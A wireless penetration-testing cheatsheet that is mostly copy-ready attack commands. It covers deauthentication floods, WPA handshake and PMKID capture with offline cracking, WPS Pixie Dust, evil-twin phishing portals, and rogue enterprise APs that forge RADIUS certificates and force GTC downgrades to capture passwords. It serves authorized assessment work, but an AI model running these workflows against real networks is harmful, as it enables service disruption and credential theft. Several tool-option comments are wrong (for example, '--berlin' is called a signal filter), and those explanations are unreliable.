---
tags:
  - hack-notes
  - wireless
---

# Wireless Cheatsheet

## Table of Contents

- [Interface Setup](#interface-setup)
- [Discovery](#discovery)
- [WPA WPA2 Handshake Capture](#wpa-wpa2-handshake-capture)
- [PMKID Attack](#pmkid-attack)
- [Cracking](#cracking)
- [WPS Attacks](#wps-attacks)
- [Evil Twin and Rogue AP](#evil-twin-and-rogue-ap)
- [WPA Enterprise Attacks](#wpa-enterprise-attacks)
- [Bettercap WiFi Module](#bettercap-wifi-module)
- [Deauthentication and Disassociation](#deauthentication-and-disassociation)
- [Sniffles](#sniffles)
- [Common Workflows](#common-workflows)
- [Quick Reference](#quick-reference)

---

## Interface Setup

Wireless attacks require a card that supports monitor mode and packet injection. Always confirm your regulatory domain so the channels you intend to test are actually usable. Test all of this only on networks you are authorized to assess.

### Identify Interfaces

```bash
# List wireless interfaces, phy index, supported modes
iw dev

# Detailed capabilities (look for "monitor" under Supported interface modes)
iw phy

# Classic view of interfaces and current mode
iwconfig

# Show which driver and chipset a device uses
airmon-ng
```

### Regulatory Domain

```bash
# Show current regulatory domain
iw reg get

# Set regulatory domain (use the country you are authorized in)
iw reg set US

# Some channels (e.g. higher 5 GHz) are no-IR or DFS and will not transmit
```

### Kill Interfering Processes

```bash
# NetworkManager and wpa_supplicant fight for the card; stop them first
airmon-ng check

# Kill the conflicting processes airmon-ng lists
airmon-ng check kill

# Manual alternative
systemctl stop NetworkManager
systemctl stop wpa_supplicant
```

### Enable Monitor Mode

```bash
# airmon-ng creates a monitor interface (often wlan0mon)
airmon-ng start wlan0

# Start on a specific channel
airmon-ng start wlan0 6

# Stop monitor mode and restore managed mode
airmon-ng stop wlan0mon
```

### Monitor Mode With iw (no airmon-ng)

```bash
# Bring the interface down, switch to monitor, bring it back up
ip link set wlan0 down
iw dev wlan0 set type monitor
ip link set wlan0 up

# Set a fixed channel
iw dev wlan0 set channel 6

# Set channel with width (HT40+, VHT80, etc.)
iw dev wlan0 set channel 36 HT40+

# Confirm the change
iw dev wlan0 info
```

### Set Card to a Fixed Channel (managed of monitor)

```bash
# When tools complain about channel hopping, pin the channel
iwconfig wlan0mon channel 6
```

---

## Discovery

### airodump-ng Survey

```bash
# Broad survey across 2.4 GHz, hopping all channels
airodump-ng wlan0mon

# Survey 5 GHz only
airodump-ng --band a wlan0mon

# Both bands
airodump-ng --band abg wlan0mon

# Show manufacturer (OUI), WPS info, and uptime
airodump-ng --manufacturer --wps --uptime wlan0mon
```

### Channel Hopping and Pinning

```bash
# Hop only over a list of channels
airodump-ng --channel 1,6,11 wlan0mon

# Lock onto one channel (needed before targeted capture)
airodump-ng --channel 6 wlan0mon
```

### Filtering

```bash
# Filter to a single target BSSID and channel, write to disk
airodump-ng --bssid AA:BB:CC:DD:EE:FF --channel 6 -w capture wlan0mon

# Filter by minimum signal strength to drop distant noise
airodump-ng --berlin 60 wlan0mon

# Only show networks matching an ESSID
airodump-ng --essid CorpWiFi wlan0mon

# Filter to a list of ESSIDs from a file
airodump-ng --essid-regex '^Corp' wlan0mon
```

### Reading the Display

```bash
# Top table  = access points (BSSID, PWR, CH, ENC, CIPHER, AUTH, ESSID)
# Bottom table = stations (clients): STATION, BSSID it is associated to, PWR
# "PSK" under AUTH = WPA/WPA2 personal; "MGT" = WPA-Enterprise (802.1X)
```

---

## WPA WPA2 Handshake Capture

The goal is to record the 4-way handshake (EAPOL frames) between a client and the AP, then crack it offline. You either wait for a client to connect or force a reconnect with a deauth.

### Start the Targeted Capture

```bash
# Lock to the target AP and channel, write all formats with prefix "handshake"
airodump-ng --bssid AA:BB:CC:DD:EE:FF --channel 6 -w handshake wlan0mon

# When the handshake is captured airodump prints "WPA handshake: AA:BB:CC:DD:EE:FF"
# top-right of the screen
```

### Force a Reconnect With Deauth

```bash
# Deauth a specific client (-c) from the AP (-a); 0 = continuous, or use a count
aireplay-ng --deauth 5 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 wlan0mon

# Broadcast deauth (hits all clients on the AP, noisier and less reliable)
aireplay-ng --deauth 5 -a AA:BB:CC:DD:EE:FF wlan0mon

# Short form of --deauth is -0
aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 wlan0mon
```

### Verify the Capture

```bash
# Confirm a usable handshake landed in the file
aircrack-ng handshake-01.cap

# Tighter validation and extraction with the hashcat toolchain
hcxpcapngtool -o /dev/null handshake-01.cap

# Use tshark to confirm 4 EAPOL frames are present
tshark -r handshake-01.cap -Y eapol
```

### Convert cap to 22000 (hashcat) Format

```bash
# Modern hashcat WPA mode 22000 (replaces old 2500 hccapx)
hcxpcapngtool -o handshake.22000 handshake-01.cap
```

---

## PMKID Attack

PMKID is a clientless attack: the AP can leak the PMKID in the first EAPOL message of the handshake, so no connected client is needed. Only some APs are vulnerable.

### Capture With hcxdumptool

```bash
# Modern hcxdumptool takes the interface directly (no need for separate airmon)
hcxdumptool -i wlan0mon -w pmkid.pcapng

# Restrict to a single channel
hcxdumptool -i wlan0mon -w pmkid.pcapng -c 6

# Restrict to specific BSSIDs using a filter list (one MAC per line)
hcxdumptool -i wlan0mon -w pmkid.pcapng --bpf=filter.bpf

# Newer hcxdumptool uses --rds for the on-screen status display
hcxdumptool -i wlan0mon -w pmkid.pcapng --rds=1
```

### Convert to 22000 Format

```bash
# Extract PMKID and EAPOL hashes from the capture into hashcat mode 22000
hcxpcapngtool -o pmkid.22000 pmkid.pcapng

# Filter out weak/manufactured ESSIDs and show what was extracted
hcxpcapngtool -o pmkid.22000 --all pmkid.pcapng
```

---

## Cracking

WPA/WPA2 PSK and PMKID both crack against the same 22000 hash format.

### aircrack-ng (dictionary)

```bash
# Crack a captured handshake with a wordlist
aircrack-ng -w /usr/share/wordlists/rockyou.txt handshake-01.cap

# Specify the BSSID when several are in the capture
aircrack-ng -w rockyou.txt -b AA:BB:CC:DD:EE:FF handshake-01.cap
```

### hashcat (mode 22000)

```bash
# Straight dictionary attack on PMKID or handshake (same mode)
hashcat -m 22000 handshake.22000 /usr/share/wordlists/rockyou.txt

# Dictionary plus rules
hashcat -m 22000 handshake.22000 rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# Mask attack (e.g. 8 digit numeric, common for default router PSKs)
hashcat -m 22000 handshake.22000 -a 3 '?d?d?d?d?d?d?d?d'

# Combinator of two wordlists
hashcat -m 22000 handshake.22000 -a 1 list1.txt list2.txt

# Show cracked results
hashcat -m 22000 handshake.22000 --show
```

### hashcat Performance and Resume

```bash
# Benchmark mode 22000 on your hardware
hashcat -b -m 22000

# Optimized kernel (faster, limits password length)
hashcat -m 22000 -O handshake.22000 rockyou.txt

# Workload profile (1 low, 3 default, 4 maximum)
hashcat -m 22000 -w 4 handshake.22000 rockyou.txt

# Sessions for pause/resume on long runs
hashcat -m 22000 --session corp handshake.22000 rockyou.txt
hashcat --session corp --restore
```

---

## WPS Attacks

WPS (Wi-Fi Protected Setup) can let you recover the PSK by attacking the 8 digit PIN, or instantly with Pixie Dust on weak implementations.

### Identify WPS APs

```bash
# wash lists WPS-enabled APs, lock state, and WPS version
wash -i wlan0mon

# Filter to 5 GHz, show all (including locked)
wash -i wlan0mon -5 -a
```

### reaver (online PIN brute)

```bash
# Standard online attack against a BSSID on its channel
reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -c 6 -vv

# Add small delay and lock-detection handling for fragile APs
reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -c 6 -d 2 -vv

# Resume uses the saved session automatically for the same BSSID
```

### reaver Pixie Dust

```bash
# Offline PIN recovery against vulnerable chipsets (-K 1 enables pixiewps)
reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -c 6 -K 1 -vv
```

### bully (alternative)

```bash
# Online PIN attack with bully
bully wlan0mon -b AA:BB:CC:DD:EE:FF -c 6 -v 3

# Pixie Dust with bully
bully wlan0mon -b AA:BB:CC:DD:EE:FF -c 6 -d -v 3
```

### pixiewps (standalone)

```bash
# Feed the values reaver/bully capture (PKE, PKR, E-Hash1/2, authkey, nonces)
pixiewps -e <PKE> -r <PKR> -s <E-Hash1> -z <E-Hash2> -a <AuthKey> -n <E-Nonce>
```

### Recover PSK From a Known PIN

```bash
# Once the PIN is known, reaver retrieves the actual PSK
reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -c 6 -p 12345670 -vv
```

---

## Evil Twin and Rogue AP

A rogue AP clones a target SSID to lure clients or capture credentials. Use deauths to push clients off the real AP toward your twin. Only on authorized engagements.

### eaphammer (PSK and captive portal)

```bash
# Generate the certificate eaphammer uses for EAP
eaphammer --cert-wizard

# Stand up an open rogue AP with a captive portal credential harvester
eaphammer -i wlan0 --essid FreeWiFi --captive-portal

# Hostile portal that also serves a credential phishing page
eaphammer -i wlan0 --essid CorpWiFi --hostile-portal
```

### hostapd-mana

```bash
# mana is a fork of hostapd that responds to client probe requests (karma)
hostapd-mana ./mana.conf

# Key directives in mana.conf:
# interface=wlan0
# ssid=CorpWiFi
# enable_mana=1
# mana_loud=1        ; respond to all probes
# mana_wpe=1         ; capture EAP credentials (enterprise)
```

### wifiphisher

```bash
# Automated rogue AP plus phishing scenario, picks a target interactively
wifiphisher

# Specify interfaces (one for the rogue AP, one for deauth)
wifiphisher -aI wlan0 -jI wlan1 -e CorpWiFi

# Use a specific phishing scenario non-interactively
wifiphisher -e CorpWiFi -p firmware-upgrade
```

### airbase-ng (manual twin)

```bash
# Create a soft AP cloning an ESSID on a channel
airbase-ng -e CorpWiFi -c 6 wlan0mon

# Karma mode: respond to any probe request (-P)
airbase-ng -P -c 6 wlan0mon

# This creates an at0 tap interface; bridge or NAT it to give clients an uplink
```

---

## WPA Enterprise Attacks

WPA-Enterprise (802.1X, shown as "MGT" in airodump) uses a RADIUS server and per-user creds. A rogue AP with the right EAP config captures the client's identity and challenge/response for offline cracking.

### eaphammer Credential Capture

```bash
# Generate the rogue cert first (clients that do not validate will accept it)
eaphammer --cert-wizard

# Stand up a rogue enterprise AP capturing EAP identities and challenge/response
eaphammer -i wlan0 --essid CorpWiFi --auth wpa-eap --creds
```

### GTC Downgrade (cleartext capture)

```bash
# Force clients negotiating PEAP/EAP to fall back to EAP-GTC, which sends the
# password in cleartext to the (rogue) server
eaphammer -i wlan0 --essid CorpWiFi --auth wpa-eap --creds --negotiate gtc-downgrade
```

### Certificate Options

```bash
# Build a cert that impersonates the real RADIUS server CN to defeat weak
# client validation
eaphammer --cert-wizard --cn radius.corp.local --country US --state CA \
  --locale "City" --org "Corp" --email admin@corp.local

# Manually point eaphammer at an existing cert/key pair
eaphammer -i wlan0 --essid CorpWiFi --auth wpa-eap --creds \
  --server-cert /path/server.pem
```

### Crack Captured MSCHAPv2

```bash
# eaphammer/hostapd-mana log the NETNTLM challenge:response; crack with hashcat
hashcat -m 5500 netntlm.txt /usr/share/wordlists/rockyou.txt

# asleap can crack the same challenge/response with a wordlist
asleap -C <challenge> -R <response> -W rockyou.txt
```

---

## Bettercap WiFi Module

Bettercap drives the card with its own wifi module for recon, deauth, and PMKID/handshake capture.

```bash
# Launch bettercap on a monitor-capable interface
bettercap -iface wlan0mon

# Inside the bettercap session:
# wifi.recon on                 ; start scanning
# wifi.recon.channel 1,6,11     ; restrict channels
# wifi.show                     ; list discovered APs/clients
# set wifi.handshakes.file caps ; where to write captures
# wifi.deauth AA:BB:CC:DD:EE:FF ; deauth a specific BSSID (or all)
# wifi.assoc AA:BB:CC:DD:EE:FF  ; trigger PMKID association attack
# wifi.recon off
```

```bash
# One-shot from the command line via a caplet
bettercap -iface wlan0mon -eval "wifi.recon on; wifi.recon.channel 6"
```

---

## Deauthentication and Disassociation

Deauth/disassoc frames knock clients off an AP. Use them to force handshakes, trigger reconnects toward an evil twin, or test resilience. They are unauthenticated management frames unless the network uses 802.11w (PMF), which blocks them.

```bash
# aireplay-ng targeted deauth (5 bursts)
aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 wlan0mon

# Continuous broadcast deauth (0 = no stop)
aireplay-ng -0 0 -a AA:BB:CC:DD:EE:FF wlan0mon

# mdk4 deauthentication/disassociation amok mode against a target
mdk4 wlan0mon d -B AA:BB:CC:DD:EE:FF -c 6

# mdk4 with a blacklist/whitelist file of BSSIDs
mdk4 wlan0mon d -b blacklist.txt -c 6
```

```bash
# Note: networks enforcing 802.11w (Protected Management Frames) ignore these
# deauths; check the RSN capabilities or that clients do not drop
```

---

## Sniffles

Sniffles is your own Go wireless security TUI (Bubble Tea) that wraps the survey-and-audit loop into ten checks. It shells out to airodump-ng under the hood, supports record and replay, and exports findings in Vinculum format.

```bash
# Run the TUI against a monitor-mode interface
sniffles --iface wlan0mon

# Record a session for later offline replay
sniffles --iface wlan0mon --record session.cap

# Replay a recorded session (no live card needed)
sniffles --replay session.cap

# Export findings for correlation in Vinculum
sniffles --replay session.cap --export vinculum
```

Use Sniffles for the fast first pass (the ten checks flag the obvious WPS, open, and weak-cipher issues), then drop to the raw aircrack-ng / hcxtools chain below for targeted capture and cracking.

---

## Common Workflows

### Workflow 1: Recon to Handshake to Crack

```bash
# 1. Set up monitor mode
airmon-ng check kill
airmon-ng start wlan0

# 2. Survey to find the target and note BSSID + channel
airodump-ng wlan0mon

# 3. Lock onto the target and start writing
airodump-ng --bssid AA:BB:CC:DD:EE:FF --channel 6 -w handshake wlan0mon

# 4. In a second terminal, deauth a connected client to force the handshake
aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 wlan0mon

# 5. Watch for "WPA handshake" in airodump, then convert and crack
hcxpcapngtool -o handshake.22000 handshake-01.cap
hashcat -m 22000 handshake.22000 /usr/share/wordlists/rockyou.txt
```

### Workflow 2: Clientless PMKID to Crack

```bash
# 1. Capture PMKIDs across the band (no deauth, no client needed)
hcxdumptool -i wlan0mon -w pmkid.pcapng

# 2. Convert to hashcat format
hcxpcapngtool -o pmkid.22000 pmkid.pcapng

# 3. Crack
hashcat -m 22000 pmkid.22000 rockyou.txt -r /usr/share/hashcat/rules/best64.rule
```

### Workflow 3: WPS Pixie Dust

```bash
# 1. Find WPS-enabled, unlocked APs
wash -i wlan0mon

# 2. Run pixie dust against a candidate
reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -c 6 -K 1 -vv

# 3. If the PIN drops, recover the PSK
reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -c 6 -p 12345670 -vv
```

### Workflow 4: Evil Twin Enterprise Credential Capture

```bash
# 1. Build a rogue cert impersonating the real RADIUS server
eaphammer --cert-wizard --cn radius.corp.local

# 2. Stand up a rogue enterprise twin with GTC downgrade and cred capture
eaphammer -i wlan0 --essid CorpWiFi --auth wpa-eap --creds --negotiate gtc-downgrade

# 3. Deauth clients off the real AP so they roam to the twin
aireplay-ng -0 0 -a AA:BB:CC:DD:EE:FF wlan0mon

# 4. Crack the captured MSCHAPv2 challenge/response (if not cleartext GTC)
hashcat -m 5500 netntlm.txt rockyou.txt
```

---

## Quick Reference

```bash
# Interface and monitor mode
iw dev                                   # list interfaces and modes
airmon-ng check kill                     # kill interfering processes
airmon-ng start wlan0                     # enable monitor mode
iw dev wlan0 set channel 6               # pin a channel

# Discovery
airodump-ng wlan0mon                     # survey all channels
airodump-ng --bssid <MAC> -c 6 -w cap wlan0mon  # targeted capture

# Handshake
aireplay-ng -0 5 -a <AP> -c <CLIENT> wlan0mon   # deauth to force handshake
hcxpcapngtool -o hs.22000 cap-01.cap     # convert to hashcat format

# PMKID (clientless)
hcxdumptool -i wlan0mon -w pmkid.pcapng  # capture PMKIDs
hcxpcapngtool -o pmkid.22000 pmkid.pcapng

# Cracking
aircrack-ng -w rockyou.txt cap-01.cap    # dictionary on handshake
hashcat -m 22000 hs.22000 rockyou.txt    # WPA/PMKID
hashcat -m 5500 netntlm.txt rockyou.txt  # enterprise MSCHAPv2

# WPS
wash -i wlan0mon                         # list WPS APs
reaver -i wlan0mon -b <MAC> -c 6 -K 1 -vv  # pixie dust

# Rogue AP / enterprise
eaphammer --cert-wizard                  # build rogue cert
eaphammer -i wlan0 --essid X --auth wpa-eap --creds  # capture EAP creds
wifiphisher -e CorpWiFi                  # automated phishing AP

# Bettercap
bettercap -iface wlan0mon                # wifi.recon on / wifi.deauth / wifi.assoc

# Sniffles
sniffles --iface wlan0mon                # TUI survey + ten checks
```

---

## Related

- Checklists: [Wireless Network Assessment](../Checklists/Wireless%20Network%20Assessment.md)
- [Active Directory and Kerberos](Active%20Directory%20and%20Kerberos.md)
- [OSINT and Recon](OSINT%20and%20Recon.md)
- [Hashcat Cheatsheet](Hashcat.md)

---
*Part of the [Pentest Field Guide](https://github.com/Su1ph3r/hack-notes-field-guide), maintained by [Cairn Security](https://cairnsecurity.com). Independent penetration testing.*
